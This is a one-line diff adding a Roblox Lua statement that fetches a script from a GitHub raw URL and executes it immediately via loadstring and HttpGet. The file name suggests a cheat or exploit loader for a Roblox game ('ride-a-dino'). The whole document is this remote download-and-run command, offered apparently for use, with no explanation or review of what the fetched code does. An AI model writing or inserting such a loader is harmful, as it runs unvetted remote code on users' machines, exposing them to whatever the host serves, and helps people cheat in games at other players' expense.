@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/ride-a-dino-spam7-1hgq99w8o5uo3j.lua"))()
